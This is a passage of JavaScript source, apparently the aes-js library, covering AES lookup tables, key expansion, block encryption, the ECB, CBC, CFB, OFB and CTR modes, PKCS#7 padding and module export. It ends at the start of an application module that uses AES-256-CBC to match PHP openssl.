    var U2 = [0x00000000, 0x0b0e090d, 0x161c121a, 0x1d121b17, 0x2c382434, 0x27362d39, 0x3a24362e, 0x312a3f23, 0x58704868, 0x537e4165, 0x4e6c5a72, 0x4562537f, 0x74486c5c, 0x7f466551, 0x62547e46, 0x695a774b, 0xb0e090d0, 0xbbee99dd, 0xa6fc82ca, 0xadf28bc7, 0x9cd8b4e4, 0x97d6bde9, 0x8ac4a6fe, 0x81caaff3, 0xe890d8b8, 0xe39ed1b5, 0xfe8ccaa2, 0xf582c3af, 0xc4a8fc8c, 0xcfa6f581, 0xd2b4ee96, 0xd9bae79b, 0x7bdb3bbb, 0x70d532b6, 0x6dc729a1, 0x66c920ac, 0x57e31f8f, 0x5ced1682, 0x41ff0d95, 0x4af10498, 0x23ab73d3, 0x28a57ade, 0x35b761c9, 0x3eb968c4, 0x0f9357e7, 0x049d5eea, 0x198f45fd, 0x12814cf0, 0xcb3bab6b, 0xc035a266, 0xdd27b971, 0xd629b07c, 0xe7038f5f, 0xec0d8652, 0xf11f9d45, 0xfa119448, 0x934be303, 0x9845ea0e, 0x8557f119, 0x8e59f814, 0xbf73c737, 0xb47dce3a, 0xa96fd52d, 0xa261dc20, 0xf6ad766d, 0xfda37f60, 0xe0b16477, 0xebbf6d7a, 0xda955259, 0xd19b5b54, 0xcc894043, 0xc787494e, 0xaedd3e05, 0xa5d33708, 0xb8c12c1f, 0xb3cf2512, 0x82e51a31, 0x89eb133c, 0x94f9082b, 0x9ff70126, 0x464de6bd, 0x4d43efb0, 0x5051f4a7, 0x5b5ffdaa, 0x6a75c289, 0x617bcb84, 0x7c69d093, 0x7767d99e, 0x1e3daed5, 0x1533a7d8, 0x0821bccf, 0x032fb5c2, 0x32058ae1, 0x390b83ec, 0x241998fb, 0x2f1791f6, 0x8d764dd6, 0x867844db, 0x9b6a5fcc, 0x906456c1, 0xa14e69e2, 0xaa4060ef, 0xb7527bf8, 0xbc5c72f5, 0xd50605be, 0xde080cb3, 0xc31a17a4, 0xc8141ea9, 0xf93e218a, 0xf2302887, 0xef223390, 0xe42c3a9d, 0x3d96dd06, 0x3698d40b, 0x2b8acf1c, 0x2084c611, 0x11aef932, 0x1aa0f03f, 0x07b2eb28, 0x0cbce225, 0x65e6956e, 0x6ee89c63, 0x73fa8774, 0x78f48e79, 0x49deb15a, 0x42d0b857, 0x5fc2a340, 0x54ccaa4d, 0xf741ecda, 0xfc4fe5d7, 0xe15dfec0, 0xea53f7cd, 0xdb79c8ee, 0xd077c1e3, 0xcd65daf4, 0xc66bd3f9, 0xaf31a4b2, 0xa43fadbf, 0xb92db6a8, 0xb223bfa5, 0x83098086, 0x8807898b, 0x9515929c, 0x9e1b9b91, 0x47a17c0a, 0x4caf7507, 0x51bd6e10, 0x5ab3671d, 0x6b99583e, 0x60975133, 0x7d854a24, 0x768b4329, 0x1fd13462, 0x14df3d6f, 0x09cd2678, 0x02c32f75, 0x33e91056, 0x38e7195b, 0x25f5024c, 0x2efb0b41, 0x8c9ad761, 0x8794de6c, 0x9a86c57b, 0x9188cc76, 0xa0a2f355, 0xabacfa58, 0xb6bee14f, 0xbdb0e842, 0xd4ea9f09, 0xdfe49604, 0xc2f68d13, 0xc9f8841e, 0xf8d2bb3d, 0xf3dcb230, 0xeecea927, 0xe5c0a02a, 0x3c7a47b1, 0x37744ebc, 0x2a6655ab, 0x21685ca6, 0x10426385, 0x1b4c6a88, 0x065e719f, 0x0d507892, 0x640a0fd9, 0x6f0406d4, 0x72161dc3, 0x791814ce, 0x48322bed, 0x433c22e0, 0x5e2e39f7, 0x552030fa, 0x01ec9ab7, 0x0ae293ba, 0x17f088ad, 0x1cfe81a0, 0x2dd4be83, 0x26dab78e, 0x3bc8ac99, 0x30c6a594, 0x599cd2df, 0x5292dbd2, 0x4f80c0c5, 0x448ec9c8, 0x75a4f6eb, 0x7eaaffe6, 0x63b8e4f1, 0x68b6edfc, 0xb10c0a67, 0xba02036a, 0xa710187d, 0xac1e1170, 0x9d342e53, 0x963a275e, 0x8b283c49, 0x80263544, 0xe97c420f, 0xe2724b02, 0xff605015, 0xf46e5918, 0xc544663b, 0xce4a6f36, 0xd3587421, 0xd8567d2c, 0x7a37a10c, 0x7139a801, 0x6c2bb316, 0x6725ba1b, 0x560f8538, 0x5d018c35, 0x40139722, 0x4b1d9e2f, 0x2247e964, 0x2949e069, 0x345bfb7e, 0x3f55f273, 0x0e7fcd50, 0x0571c45d, 0x1863df4a, 0x136dd647, 0xcad731dc, 0xc1d938d1, 0xdccb23c6, 0xd7c52acb, 0xe6ef15e8, 0xede11ce5, 0xf0f307f2, 0xfbfd0eff, 0x92a779b4, 0x99a970b9, 0x84bb6bae, 0x8fb562a3, 0xbe9f5d80, 0xb591548d, 0xa8834f9a, 0xa38d4697];
    var U3 = [0x00000000, 0x0d0b0e09, 0x1a161c12, 0x171d121b, 0x342c3824, 0x3927362d, 0x2e3a2436, 0x23312a3f, 0x68587048, 0x65537e41, 0x724e6c5a, 0x7f456253, 0x5c74486c, 0x517f4665, 0x4662547e, 0x4b695a77, 0xd0b0e090, 0xddbbee99, 0xcaa6fc82, 0xc7adf28b, 0xe49cd8b4, 0xe997d6bd, 0xfe8ac4a6, 0xf381caaf, 0xb8e890d8, 0xb5e39ed1, 0xa2fe8cca, 0xaff582c3, 0x8cc4a8fc, 0x81cfa6f5, 0x96d2b4ee, 0x9bd9bae7, 0xbb7bdb3b, 0xb670d532, 0xa16dc729, 0xac66c920, 0x8f57e31f, 0x825ced16, 0x9541ff0d, 0x984af104, 0xd323ab73, 0xde28a57a, 0xc935b761, 0xc43eb968, 0xe70f9357, 0xea049d5e, 0xfd198f45, 0xf012814c, 0x6bcb3bab, 0x66c035a2, 0x71dd27b9, 0x7cd629b0, 0x5fe7038f, 0x52ec0d86, 0x45f11f9d, 0x48fa1194, 0x03934be3, 0x0e9845ea, 0x198557f1, 0x148e59f8, 0x37bf73c7, 0x3ab47dce, 0x2da96fd5, 0x20a261dc, 0x6df6ad76, 0x60fda37f, 0x77e0b164, 0x7aebbf6d, 0x59da9552, 0x54d19b5b, 0x43cc8940, 0x4ec78749, 0x05aedd3e, 0x08a5d337, 0x1fb8c12c, 0x12b3cf25, 0x3182e51a, 0x3c89eb13, 0x2b94f908, 0x269ff701, 0xbd464de6, 0xb04d43ef, 0xa75051f4, 0xaa5b5ffd, 0x896a75c2, 0x84617bcb, 0x937c69d0, 0x9e7767d9, 0xd51e3dae, 0xd81533a7, 0xcf0821bc, 0xc2032fb5, 0xe132058a, 0xec390b83, 0xfb241998, 0xf62f1791, 0xd68d764d, 0xdb867844, 0xcc9b6a5f, 0xc1906456, 0xe2a14e69, 0xefaa4060, 0xf8b7527b, 0xf5bc5c72, 0xbed50605, 0xb3de080c, 0xa4c31a17, 0xa9c8141e, 0x8af93e21, 0x87f23028, 0x90ef2233, 0x9de42c3a, 0x063d96dd, 0x0b3698d4, 0x1c2b8acf, 0x112084c6, 0x3211aef9, 0x3f1aa0f0, 0x2807b2eb, 0x250cbce2, 0x6e65e695, 0x636ee89c, 0x7473fa87, 0x7978f48e, 0x5a49deb1, 0x5742d0b8, 0x405fc2a3, 0x4d54ccaa, 0xdaf741ec, 0xd7fc4fe5, 0xc0e15dfe, 0xcdea53f7, 0xeedb79c8, 0xe3d077c1, 0xf4cd65da, 0xf9c66bd3, 0xb2af31a4, 0xbfa43fad, 0xa8b92db6, 0xa5b223bf, 0x86830980, 0x8b880789, 0x9c951592, 0x919e1b9b, 0x0a47a17c, 0x074caf75, 0x1051bd6e, 0x1d5ab367, 0x3e6b9958, 0x33609751, 0x247d854a, 0x29768b43, 0x621fd134, 0x6f14df3d, 0x7809cd26, 0x7502c32f, 0x5633e910, 0x5b38e719, 0x4c25f502, 0x412efb0b, 0x618c9ad7, 0x6c8794de, 0x7b9a86c5, 0x769188cc, 0x55a0a2f3, 0x58abacfa, 0x4fb6bee1, 0x42bdb0e8, 0x09d4ea9f, 0x04dfe496, 0x13c2f68d, 0x1ec9f884, 0x3df8d2bb, 0x30f3dcb2, 0x27eecea9, 0x2ae5c0a0, 0xb13c7a47, 0xbc37744e, 0xab2a6655, 0xa621685c, 0x85104263, 0x881b4c6a, 0x9f065e71, 0x920d5078, 0xd9640a0f, 0xd46f0406, 0xc372161d, 0xce791814, 0xed48322b, 0xe0433c22, 0xf75e2e39, 0xfa552030, 0xb701ec9a, 0xba0ae293, 0xad17f088, 0xa01cfe81, 0x832dd4be, 0x8e26dab7, 0x993bc8ac, 0x9430c6a5, 0xdf599cd2, 0xd25292db, 0xc54f80c0, 0xc8448ec9, 0xeb75a4f6, 0xe67eaaff, 0xf163b8e4, 0xfc68b6ed, 0x67b10c0a, 0x6aba0203, 0x7da71018, 0x70ac1e11, 0x539d342e, 0x5e963a27, 0x498b283c, 0x44802635, 0x0fe97c42, 0x02e2724b, 0x15ff6050, 0x18f46e59, 0x3bc54466, 0x36ce4a6f, 0x21d35874, 0x2cd8567d, 0x0c7a37a1, 0x017139a8, 0x166c2bb3, 0x1b6725ba, 0x38560f85, 0x355d018c, 0x22401397, 0x2f4b1d9e, 0x642247e9, 0x692949e0, 0x7e345bfb, 0x733f55f2, 0x500e7fcd, 0x5d0571c4, 0x4a1863df, 0x47136dd6, 0xdccad731, 0xd1c1d938, 0xc6dccb23, 0xcbd7c52a, 0xe8e6ef15, 0xe5ede11c, 0xf2f0f307, 0xfffbfd0e, 0xb492a779, 0xb999a970, 0xae84bb6b, 0xa38fb562, 0x80be9f5d, 0x8db59154, 0x9aa8834f, 0x97a38d46];
    var U4 = [0x00000000, 0x090d0b0e, 0x121a161c, 0x1b171d12, 0x24342c38, 0x2d392736, 0x362e3a24, 0x3f23312a, 0x48685870, 0x4165537e, 0x5a724e6c, 0x537f4562, 0x6c5c7448, 0x65517f46, 0x7e466254, 0x774b695a, 0x90d0b0e0, 0x99ddbbee, 0x82caa6fc, 0x8bc7adf2, 0xb4e49cd8, 0xbde997d6, 0xa6fe8ac4, 0xaff381ca, 0xd8b8e890, 0xd1b5e39e, 0xcaa2fe8c, 0xc3aff582, 0xfc8cc4a8, 0xf581cfa6, 0xee96d2b4, 0xe79bd9ba, 0x3bbb7bdb, 0x32b670d5, 0x29a16dc7, 0x20ac66c9, 0x1f8f57e3, 0x16825ced, 0x0d9541ff, 0x04984af1, 0x73d323ab, 0x7ade28a5, 0x61c935b7, 0x68c43eb9, 0x57e70f93, 0x5eea049d, 0x45fd198f, 0x4cf01281, 0xab6bcb3b, 0xa266c035, 0xb971dd27, 0xb07cd629, 0x8f5fe703, 0x8652ec0d, 0x9d45f11f, 0x9448fa11, 0xe303934b, 0xea0e9845, 0xf1198557, 0xf8148e59, 0xc737bf73, 0xce3ab47d, 0xd52da96f, 0xdc20a261, 0x766df6ad, 0x7f60fda3, 0x6477e0b1, 0x6d7aebbf, 0x5259da95, 0x5b54d19b, 0x4043cc89, 0x494ec787, 0x3e05aedd, 0x3708a5d3, 0x2c1fb8c1, 0x2512b3cf, 0x1a3182e5, 0x133c89eb, 0x082b94f9, 0x01269ff7, 0xe6bd464d, 0xefb04d43, 0xf4a75051, 0xfdaa5b5f, 0xc2896a75, 0xcb84617b, 0xd0937c69, 0xd99e7767, 0xaed51e3d, 0xa7d81533, 0xbccf0821, 0xb5c2032f, 0x8ae13205, 0x83ec390b, 0x98fb2419, 0x91f62f17, 0x4dd68d76, 0x44db8678, 0x5fcc9b6a, 0x56c19064, 0x69e2a14e, 0x60efaa40, 0x7bf8b752, 0x72f5bc5c, 0x05bed506, 0x0cb3de08, 0x17a4c31a, 0x1ea9c814, 0x218af93e, 0x2887f230, 0x3390ef22, 0x3a9de42c, 0xdd063d96, 0xd40b3698, 0xcf1c2b8a, 0xc6112084, 0xf93211ae, 0xf03f1aa0, 0xeb2807b2, 0xe2250cbc, 0x956e65e6, 0x9c636ee8, 0x877473fa, 0x8e7978f4, 0xb15a49de, 0xb85742d0, 0xa3405fc2, 0xaa4d54cc, 0xecdaf741, 0xe5d7fc4f, 0xfec0e15d, 0xf7cdea53, 0xc8eedb79, 0xc1e3d077, 0xdaf4cd65, 0xd3f9c66b, 0xa4b2af31, 0xadbfa43f, 0xb6a8b92d, 0xbfa5b223, 0x80868309, 0x898b8807, 0x929c9515, 0x9b919e1b, 0x7c0a47a1, 0x75074caf, 0x6e1051bd, 0x671d5ab3, 0x583e6b99, 0x51336097, 0x4a247d85, 0x4329768b, 0x34621fd1, 0x3d6f14df, 0x267809cd, 0x2f7502c3, 0x105633e9, 0x195b38e7, 0x024c25f5, 0x0b412efb, 0xd7618c9a, 0xde6c8794, 0xc57b9a86, 0xcc769188, 0xf355a0a2, 0xfa58abac, 0xe14fb6be, 0xe842bdb0, 0x9f09d4ea, 0x9604dfe4, 0x8d13c2f6, 0x841ec9f8, 0xbb3df8d2, 0xb230f3dc, 0xa927eece, 0xa02ae5c0, 0x47b13c7a, 0x4ebc3774, 0x55ab2a66, 0x5ca62168, 0x63851042, 0x6a881b4c, 0x719f065e, 0x78920d50, 0x0fd9640a, 0x06d46f04, 0x1dc37216, 0x14ce7918, 0x2bed4832, 0x22e0433c, 0x39f75e2e, 0x30fa5520, 0x9ab701ec, 0x93ba0ae2, 0x88ad17f0, 0x81a01cfe, 0xbe832dd4, 0xb78e26da, 0xac993bc8, 0xa59430c6, 0xd2df599c, 0xdbd25292, 0xc0c54f80, 0xc9c8448e, 0xf6eb75a4, 0xffe67eaa, 0xe4f163b8, 0xedfc68b6, 0x0a67b10c, 0x036aba02, 0x187da710, 0x1170ac1e, 0x2e539d34, 0x275e963a, 0x3c498b28, 0x35448026, 0x420fe97c, 0x4b02e272, 0x5015ff60, 0x5918f46e, 0x663bc544, 0x6f36ce4a, 0x7421d358, 0x7d2cd856, 0xa10c7a37, 0xa8017139, 0xb3166c2b, 0xba1b6725, 0x8538560f, 0x8c355d01, 0x97224013, 0x9e2f4b1d, 0xe9642247, 0xe0692949, 0xfb7e345b, 0xf2733f55, 0xcd500e7f, 0xc45d0571, 0xdf4a1863, 0xd647136d, 0x31dccad7, 0x38d1c1d9, 0x23c6dccb, 0x2acbd7c5, 0x15e8e6ef, 0x1ce5ede1, 0x07f2f0f3, 0x0efffbfd, 0x79b492a7, 0x70b999a9, 0x6bae84bb, 0x62a38fb5, 0x5d80be9f, 0x548db591, 0x4f9aa883, 0x4697a38d];

    function convertToInt32(bytes) {
        var result = [];
        for (var i = 0; i < bytes.length; i += 4) {
            result.push(
                (bytes[i    ] << 24) |
                (bytes[i + 1] << 16) |
                (bytes[i + 2] <<  8) |
                 bytes[i + 3]
            );
        }
        return result;
    }

    var AES = function(key) {
        if (!(this instanceof AES)) {
            throw Error('AES must be instanitated with `new`');
        }

        Object.defineProperty(this, 'key', {
            value: coerceArray(key, true)
        });

        this._prepare();
    }


    AES.prototype._prepare = function() {

        var rounds = numberOfRounds[this.key.length];
        if (rounds == null) {
            throw new Error('invalid key size (must be 16, 24 or 32 bytes)');
        }

        // encryption round keys
        this._Ke = [];

        // decryption round keys
        this._Kd = [];

        for (var i = 0; i <= rounds; i++) {
            this._Ke.push([0, 0, 0, 0]);
            this._Kd.push([0, 0, 0, 0]);
        }

        var roundKeyCount = (rounds + 1) * 4;
        var KC = this.key.length / 4;

        // convert the key into ints
        var tk = convertToInt32(this.key);

        // copy values into round key arrays
        var index;
        for (var i = 0; i < KC; i++) {
            index = i >> 2;
            this._Ke[index][i % 4] = tk[i];
            this._Kd[rounds - index][i % 4] = tk[i];
        }

        // key expansion (fips-197 section 5.2)
        var rconpointer = 0;
        var t = KC, tt;
        while (t < roundKeyCount) {
            tt = tk[KC - 1];
            tk[0] ^= ((S[(tt >> 16) & 0xFF] << 24) ^
                      (S[(tt >>  8) & 0xFF] << 16) ^
                      (S[ tt        & 0xFF] <<  8) ^
                       S[(tt >> 24) & 0xFF]        ^
                      (rcon[rconpointer] << 24));
            rconpointer += 1;

            // key expansion (for non-256 bit)
            if (KC != 8) {
                for (var i = 1; i < KC; i++) {
                    tk[i] ^= tk[i - 1];
                }

            // key expansion for 256-bit keys is "slightly different" (fips-197)
            } else {
                for (var i = 1; i < (KC / 2); i++) {
                    tk[i] ^= tk[i - 1];
                }
                tt = tk[(KC / 2) - 1];

                tk[KC / 2] ^= (S[ tt        & 0xFF]        ^
                              (S[(tt >>  8) & 0xFF] <<  8) ^
                              (S[(tt >> 16) & 0xFF] << 16) ^
                              (S[(tt >> 24) & 0xFF] << 24));

                for (var i = (KC / 2) + 1; i < KC; i++) {
                    tk[i] ^= tk[i - 1];
                }
            }

            // copy values into round key arrays
            var i = 0, r, c;
            while (i < KC && t < roundKeyCount) {
                r = t >> 2;
                c = t % 4;
                this._Ke[r][c] = tk[i];
                this._Kd[rounds - r][c] = tk[i++];
                t++;
            }
        }

        // inverse-cipher-ify the decryption round key (fips-197 section 5.3)
        for (var r = 1; r < rounds; r++) {
            for (var c = 0; c < 4; c++) {
                tt = this._Kd[r][c];
                this._Kd[r][c] = (U1[(tt >> 24) & 0xFF] ^
                                  U2[(tt >> 16) & 0xFF] ^
                                  U3[(tt >>  8) & 0xFF] ^
                                  U4[ tt        & 0xFF]);
            }
        }
    }

    AES.prototype.encrypt = function(plaintext) {
        if (plaintext.length != 16) {
            throw new Error('invalid plaintext size (must be 16 bytes)');
        }

        var rounds = this._Ke.length - 1;
        var a = [0, 0, 0, 0];

        // convert plaintext to (ints ^ key)
        var t = convertToInt32(plaintext);
        for (var i = 0; i < 4; i++) {
            t[i] ^= this._Ke[0][i];
        }

        // apply round transforms
        for (var r = 1; r < rounds; r++) {
            for (var i = 0; i < 4; i++) {
                a[i] = (T1[(t[ i         ] >> 24) & 0xff] ^
                        T2[(t[(i + 1) % 4] >> 16) & 0xff] ^
                        T3[(t[(i + 2) % 4] >>  8) & 0xff] ^
                        T4[ t[(i + 3) % 4]        & 0xff] ^
                        this._Ke[r][i]);
            }
            t = a.slice();
        }

        // the last round is special
        var result = createArray(16), tt;
        for (var i = 0; i < 4; i++) {
            tt = this._Ke[rounds][i];
            result[4 * i    ] = (S[(t[ i         ] >> 24) & 0xff] ^ (tt >> 24)) & 0xff;
            result[4 * i + 1] = (S[(t[(i + 1) % 4] >> 16) & 0xff] ^ (tt >> 16)) & 0xff;
            result[4 * i + 2] = (S[(t[(i + 2) % 4] >>  8) & 0xff] ^ (tt >>  8)) & 0xff;
            result[4 * i + 3] = (S[ t[(i + 3) % 4]        & 0xff] ^  tt       ) & 0xff;
        }

        return result;
    }

    AES.prototype.decrypt = function(ciphertext) {
        if (ciphertext.length != 16) {
            throw new Error('invalid ciphertext size (must be 16 bytes)');
        }

        var rounds = this._Kd.length - 1;
        var a = [0, 0, 0, 0];

        // convert plaintext to (ints ^ key)
        var t = convertToInt32(ciphertext);
        for (var i = 0; i < 4; i++) {
            t[i] ^= this._Kd[0][i];
        }

        // apply round transforms
        for (var r = 1; r < rounds; r++) {
            for (var i = 0; i < 4; i++) {
                a[i] = (T5[(t[ i          ] >> 24) & 0xff] ^
                        T6[(t[(i + 3) % 4] >> 16) & 0xff] ^
                        T7[(t[(i + 2) % 4] >>  8) & 0xff] ^
                        T8[ t[(i + 1) % 4]        & 0xff] ^
                        this._Kd[r][i]);
            }
            t = a.slice();
        }

        // the last round is special
        var result = createArray(16), tt;
        for (var i = 0; i < 4; i++) {
            tt = this._Kd[rounds][i];
            result[4 * i    ] = (Si[(t[ i         ] >> 24) & 0xff] ^ (tt >> 24)) & 0xff;
            result[4 * i + 1] = (Si[(t[(i + 3) % 4] >> 16) & 0xff] ^ (tt >> 16)) & 0xff;
            result[4 * i + 2] = (Si[(t[(i + 2) % 4] >>  8) & 0xff] ^ (tt >>  8)) & 0xff;
            result[4 * i + 3] = (Si[ t[(i + 1) % 4]        & 0xff] ^  tt       ) & 0xff;
        }

        return result;
    }


    /**
     *  Mode Of Operation - Electonic Codebook (ECB)
     */
    var ModeOfOperationECB = function(key) {
        if (!(this instanceof ModeOfOperationECB)) {
            throw Error('AES must be instanitated with `new`');
        }

        this.description = "Electronic Code Block";
        this.name = "ecb";

        this._aes = new AES(key);
    }

    ModeOfOperationECB.prototype.encrypt = function(plaintext) {
        plaintext = coerceArray(plaintext);

        if ((plaintext.length % 16) !== 0) {
            throw new Error('invalid plaintext size (must be multiple of 16 bytes)');
        }

        var ciphertext = createArray(plaintext.length);
        var block = createArray(16);

        for (var i = 0; i < plaintext.length; i += 16) {
            copyArray(plaintext, block, 0, i, i + 16);
            block = this._aes.encrypt(block);
            copyArray(block, ciphertext, i);
        }

        return ciphertext;
    }

    ModeOfOperationECB.prototype.decrypt = function(ciphertext) {
        ciphertext = coerceArray(ciphertext);

        if ((ciphertext.length % 16) !== 0) {
            throw new Error('invalid ciphertext size (must be multiple of 16 bytes)');
        }

        var plaintext = createArray(ciphertext.length);
        var block = createArray(16);

        for (var i = 0; i < ciphertext.length; i += 16) {
            copyArray(ciphertext, block, 0, i, i + 16);
            block = this._aes.decrypt(block);
            copyArray(block, plaintext, i);
        }

        return plaintext;
    }


    /**
     *  Mode Of Operation - Cipher Block Chaining (CBC)
     */
    var ModeOfOperationCBC = function(key, iv) {
        if (!(this instanceof ModeOfOperationCBC)) {
            throw Error('AES must be instanitated with `new`');
        }

        this.description = "Cipher Block Chaining";
        this.name = "cbc";

        if (!iv) {
            iv = createArray(16);

        } else if (iv.length != 16) {
            throw new Error('invalid initialation vector size (must be 16 bytes)');
        }

        this._lastCipherblock = coerceArray(iv, true);

        this._aes = new AES(key);
    }

    ModeOfOperationCBC.prototype.encrypt = function(plaintext) {
        plaintext = coerceArray(plaintext);

        if ((plaintext.length % 16) !== 0) {
            throw new Error('invalid plaintext size (must be multiple of 16 bytes)');
        }

        var ciphertext = createArray(plaintext.length);
        var block = createArray(16);

        for (var i = 0; i < plaintext.length; i += 16) {
            copyArray(plaintext, block, 0, i, i + 16);

            for (var j = 0; j < 16; j++) {
                block[j] ^= this._lastCipherblock[j];
            }

            this._lastCipherblock = this._aes.encrypt(block);
            copyArray(this._lastCipherblock, ciphertext, i);
        }

        return ciphertext;
    }

    ModeOfOperationCBC.prototype.decrypt = function(ciphertext) {
        ciphertext = coerceArray(ciphertext);

        if ((ciphertext.length % 16) !== 0) {
            throw new Error('invalid ciphertext size (must be multiple of 16 bytes)');
        }

        var plaintext = createArray(ciphertext.length);
        var block = createArray(16);

        for (var i = 0; i < ciphertext.length; i += 16) {
            copyArray(ciphertext, block, 0, i, i + 16);
            block = this._aes.decrypt(block);

            for (var j = 0; j < 16; j++) {
                plaintext[i + j] = block[j] ^ this._lastCipherblock[j];
            }

            copyArray(ciphertext, this._lastCipherblock, 0, i, i + 16);
        }

        return plaintext;
    }


    /**
     *  Mode Of Operation - Cipher Feedback (CFB)
     */
    var ModeOfOperationCFB = function(key, iv, segmentSize) {
        if (!(this instanceof ModeOfOperationCFB)) {
            throw Error('AES must be instanitated with `new`');
        }

        this.description = "Cipher Feedback";
        this.name = "cfb";

        if (!iv) {
            iv = createArray(16);

        } else if (iv.length != 16) {
            throw new Error('invalid initialation vector size (must be 16 size)');
        }

        if (!segmentSize) { segmentSize = 1; }

        this.segmentSize = segmentSize;

        this._shiftRegister = coerceArray(iv, true);

        this._aes = new AES(key);
    }

    ModeOfOperationCFB.prototype.encrypt = function(plaintext) {
        if ((plaintext.length % this.segmentSize) != 0) {
            throw new Error('invalid plaintext size (must be segmentSize bytes)');
        }

        var encrypted = coerceArray(plaintext, true);

        var xorSegment;
        for (var i = 0; i < encrypted.length; i += this.segmentSize) {
            xorSegment = this._aes.encrypt(this._shiftRegister);
            for (var j = 0; j < this.segmentSize; j++) {
                encrypted[i + j] ^= xorSegment[j];
            }

            // Shift the register
            copyArray(this._shiftRegister, this._shiftRegister, 0, this.segmentSize);
            copyArray(encrypted, this._shiftRegister, 16 - this.segmentSize, i, i + this.segmentSize);
        }

        return encrypted;
    }

    ModeOfOperationCFB.prototype.decrypt = function(ciphertext) {
        if ((ciphertext.length % this.segmentSize) != 0) {
            throw new Error('invalid ciphertext size (must be segmentSize bytes)');
        }

        var plaintext = coerceArray(ciphertext, true);

        var xorSegment;
        for (var i = 0; i < plaintext.length; i += this.segmentSize) {
            xorSegment = this._aes.encrypt(this._shiftRegister);

            for (var j = 0; j < this.segmentSize; j++) {
                plaintext[i + j] ^= xorSegment[j];
            }

            // Shift the register
            copyArray(this._shiftRegister, this._shiftRegister, 0, this.segmentSize);
            copyArray(ciphertext, this._shiftRegister, 16 - this.segmentSize, i, i + this.segmentSize);
        }

        return plaintext;
    }

    /**
     *  Mode Of Operation - Output Feedback (OFB)
     */
    var ModeOfOperationOFB = function(key, iv) {
        if (!(this instanceof ModeOfOperationOFB)) {
            throw Error('AES must be instanitated with `new`');
        }

        this.description = "Output Feedback";
        this.name = "ofb";

        if (!iv) {
            iv = createArray(16);

        } else if (iv.length != 16) {
            throw new Error('invalid initialation vector size (must be 16 bytes)');
        }

        this._lastPrecipher = coerceArray(iv, true);
        this._lastPrecipherIndex = 16;

        this._aes = new AES(key);
    }

    ModeOfOperationOFB.prototype.encrypt = function(plaintext) {
        var encrypted = coerceArray(plaintext, true);

        for (var i = 0; i < encrypted.length; i++) {
            if (this._lastPrecipherIndex === 16) {
                this._lastPrecipher = this._aes.encrypt(this._lastPrecipher);
                this._lastPrecipherIndex = 0;
            }
            encrypted[i] ^= this._lastPrecipher[this._lastPrecipherIndex++];
        }

        return encrypted;
    }

    // Decryption is symetric
    ModeOfOperationOFB.prototype.decrypt = ModeOfOperationOFB.prototype.encrypt;


    /**
     *  Counter object for CTR common mode of operation
     */
    var Counter = function(initialValue) {
        if (!(this instanceof Counter)) {
            throw Error('Counter must be instanitated with `new`');
        }

        // We allow 0, but anything false-ish uses the default 1
        if (initialValue !== 0 && !initialValue) { initialValue = 1; }

        if (typeof(initialValue) === 'number') {
            this._counter = createArray(16);
            this.setValue(initialValue);

        } else {
            this.setBytes(initialValue);
        }
    }

    Counter.prototype.setValue = function(value) {
        if (typeof(value) !== 'number' || parseInt(value) != value) {
            throw new Error('invalid counter value (must be an integer)');
        }

        // We cannot safely handle numbers beyond the safe range for integers
        if (value > Number.MAX_SAFE_INTEGER) {
            throw new Error('integer value out of safe range');
        }

        for (var index = 15; index >= 0; --index) {
            this._counter[index] = value % 256;
            value = parseInt(value / 256);
        }
    }

    Counter.prototype.setBytes = function(bytes) {
        bytes = coerceArray(bytes, true);

        if (bytes.length != 16) {
            throw new Error('invalid counter bytes size (must be 16 bytes)');
        }

        this._counter = bytes;
    };

    Counter.prototype.increment = function() {
        for (var i = 15; i >= 0; i--) {
            if (this._counter[i] === 255) {
                this._counter[i] = 0;
            } else {
                this._counter[i]++;
                break;
            }
        }
    }


    /**
     *  Mode Of Operation - Counter (CTR)
     */
    var ModeOfOperationCTR = function(key, counter) {
        if (!(this instanceof ModeOfOperationCTR)) {
            throw Error('AES must be instanitated with `new`');
        }

        this.description = "Counter";
        this.name = "ctr";

        if (!(counter instanceof Counter)) {
            counter = new Counter(counter)
        }

        this._counter = counter;

        this._remainingCounter = null;
        this._remainingCounterIndex = 16;

        this._aes = new AES(key);
    }

    ModeOfOperationCTR.prototype.encrypt = function(plaintext) {
        var encrypted = coerceArray(plaintext, true);

        for (var i = 0; i < encrypted.length; i++) {
            if (this._remainingCounterIndex === 16) {
                this._remainingCounter = this._aes.encrypt(this._counter._counter);
                this._remainingCounterIndex = 0;
                this._counter.increment();
            }
            encrypted[i] ^= this._remainingCounter[this._remainingCounterIndex++];
        }

        return encrypted;
    }

    // Decryption is symetric
    ModeOfOperationCTR.prototype.decrypt = ModeOfOperationCTR.prototype.encrypt;


    ///////////////////////
    // Padding

    // See:https://tools.ietf.org/html/rfc2315
    function pkcs7pad(data) {
        data = coerceArray(data, true);
        var padder = 16 - (data.length % 16);
        var result = createArray(data.length + padder);
        copyArray(data, result);
        for (var i = data.length; i < result.length; i++) {
            result[i] = padder;
        }
        return result;
    }

    function pkcs7strip(data) {
        data = coerceArray(data, true);
        if (data.length < 16) { throw new Error('PKCS#7 invalid length'); }

        var padder = data[data.length - 1];
        if (padder > 16) { throw new Error('PKCS#7 padding byte out of range'); }

        var length = data.length - padder;
        for (var i = 0; i < padder; i++) {
            if (data[length + i] !== padder) {
                throw new Error('PKCS#7 invalid padding byte');
            }
        }

        var result = createArray(length);
        copyArray(data, result, 0, 0, length);
        return result;
    }

    ///////////////////////
    // Exporting


    // The block cipher
    var aesjs = {
        AES: AES,
        Counter: Counter,

        ModeOfOperation: {
            ecb: ModeOfOperationECB,
            cbc: ModeOfOperationCBC,
            cfb: ModeOfOperationCFB,
            ofb: ModeOfOperationOFB,
            ctr: ModeOfOperationCTR
        },

        utils: {
            hex: convertHex,
            utf8: convertUtf8
        },

        padding: {
            pkcs7: {
                pad: pkcs7pad,
                strip: pkcs7strip
            }
        },

        _arrayTest: {
            coerceArray: coerceArray,
            createArray: createArray,
            copyArray: copyArray,
        }
    };


    // node.js
    if (typeof exports !== 'undefined') {
        module.exports = aesjs

    // RequireJS/AMD
    // http://www.requirejs.org/docs/api.html
    // https://github.com/amdjs/amdjs-api/wiki/AMD
    } else if (typeof(define) === 'function' && define.amd) {
        define([], function() { return aesjs; });

    // Web Browsers
    } else {

        // If there was an existing library at "aesjs" make sure it's still available
        if (root.aesjs) {
            aesjs._aesjs = root.aesjs;
        }

        root.aesjs = aesjs;
    }


})(this);


// Crypto module — AES-256-CBC transport matching PHP openssl (crypto.php).
// Always uses vendored sha256 + aesjs so behaviour is identical on HTTPS,
// http://192.168.x.x, and localhost (Web Crypto subtle is intentionally unused).
try {
(function() {
  if (typeof __BUILD === 'undefined' || !__BUILD.encrypted) return;

